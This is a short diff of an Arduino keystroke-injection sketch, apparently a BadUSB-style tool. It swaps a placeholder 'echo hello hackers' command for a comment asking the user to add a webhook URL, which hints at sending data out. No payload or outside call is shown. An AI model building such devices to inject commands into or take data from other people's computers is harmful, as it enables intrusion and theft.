@@ -1,8 +1,7 @@
+// Make sure to add your webhook url on line 30
 #include<Keyboard.h>
 #define KEY_DELAY 50 //delay between keystrokes for slow computers
 
-//a command line to execute
-const char command [] = "echo hello hackers";
 
 void setup() {
   Keyboard.begin();
